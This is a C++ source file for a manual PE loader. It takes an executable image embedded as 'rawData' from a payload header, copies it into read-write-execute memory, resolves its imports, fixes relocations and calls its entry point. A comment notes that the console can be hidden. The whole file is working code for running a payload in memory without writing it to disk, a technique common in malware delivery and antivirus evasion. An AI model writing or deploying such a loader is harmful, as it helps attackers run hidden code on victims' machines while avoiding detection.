/*

Author: Barruh @reverserb

*/

#include <Windows.h>
#include <iostream>

#include "Payload.h"

int CopyImports(IMAGE_IMPORT_DESCRIPTOR* imp_desc, void* load_address)
{
    while (imp_desc->Name || imp_desc->TimeDateStamp) {
        IMAGE_THUNK_DATA* name_table, * address_table, * thunk;
        char* dll_name = (char*)load_address + imp_desc->Name;
        HMODULE module = LoadLibraryA(dll_name);
        if (!module) {
            return 0;
        }
        name_table = (IMAGE_THUNK_DATA*)((char*)load_address + imp_desc->OriginalFirstThunk);
        address_table = (IMAGE_THUNK_DATA*)((char*)load_address + imp_desc->FirstThunk);

        thunk = name_table == load_address ? address_table : name_table;
        if (thunk == load_address)
            return 0;
        while (thunk->u1.AddressOfData) {
            char* func_name;
            // is ordinal or no
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                func_name = (char*)(thunk->u1.Ordinal & 0xffff);
            else
                func_name = ((IMAGE_IMPORT_BY_NAME*)((char*)load_address + thunk->u1.AddressOfData))->Name;
            address_table->u1.Function = (DWORD)GetProcAddress(module, (char*)func_name);
            thunk++;
            address_table++;
        }
        imp_desc++;
    }
    return 1;
}

void* MapModuleInMemory(void* rawData)
{
    IMAGE_DOS_HEADER* DosHeader = (IMAGE_DOS_HEADER*)rawData;
    IMAGE_NT_HEADERS* NtHeader = (IMAGE_NT_HEADERS*)((char*)rawData + DosHeader->e_lfanew);

    // If not having Relocations
    IMAGE_DATA_DIRECTORY* reloc_entry = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!reloc_entry->VirtualAddress || !reloc_entry->Size)
        return NULL;

    LPVOID outputImage = VirtualAlloc(0, (int)NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!outputImage)
        return NULL;

    // Copy sections and image...
    IMAGE_SECTION_HEADER* SectionHeader = IMAGE_FIRST_SECTION(NtHeader);
    size_t HeadersSize = (char*)(SectionHeader + NtHeader->FileHeader.NumberOfSections) - (char*)rawData;
    memcpy(outputImage, rawData, HeadersSize);
    for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
        memcpy((char*)outputImage + SectionHeader[i].VirtualAddress, (char*)rawData + SectionHeader[i].PointerToRawData, SectionHeader[i].SizeOfRawData);


    // Copy IAT (Import Address Table)
    IMAGE_DATA_DIRECTORY* imp_entry = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR* ImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)((char*)outputImage + imp_entry->VirtualAddress);
    if (!CopyImports(ImportDesc, outputImage)) {
        VirtualFree(outputImage, 0, MEM_RELEASE);
        return NULL;
    }

    // Fix relocations (need .reloc section)
    IMAGE_BASE_RELOCATION* BaseRelocation = (IMAGE_BASE_RELOCATION*)((char*)outputImage + reloc_entry->VirtualAddress);
    IMAGE_BASE_RELOCATION* CurReloc = BaseRelocation, *reloc_end;
    DWORD DeltaImageBase = (DWORD)outputImage - NtHeader->OptionalHeader.ImageBase;
    reloc_end = (IMAGE_BASE_RELOCATION*)((char*)BaseRelocation + reloc_entry->Size);
    while (CurReloc < reloc_end && CurReloc->VirtualAddress) {
        int count = (CurReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* CurEntry = (WORD*)(CurReloc + 1);
        void* PageVa = (void*)((char*)(DWORD)outputImage + CurReloc->VirtualAddress);

        while (count--) {
            /* is valid x86 relocation? */
            if (*CurEntry >> 12 == IMAGE_REL_BASED_HIGHLOW)
                *(DWORD*)((char*)PageVa + (*CurEntry & 0x0fff)) += DeltaImageBase;
            CurEntry++;
        }
        /* advance to the next one */
        CurReloc = (IMAGE_BASE_RELOCATION*)((char*)CurReloc + CurReloc->SizeOfBlock);
    }

    return (void*)((char*)outputImage + NtHeader->OptionalHeader.AddressOfEntryPoint);
}

int main(int argc, char* argv[]) {

    // Can use FreeConsole() to hide the console 

    void* OEP = MapModuleInMemory(rawData);

    printf("Mapped Image -> %p", OEP);
    
    (*(void(*)())(OEP))();

    return 0;
}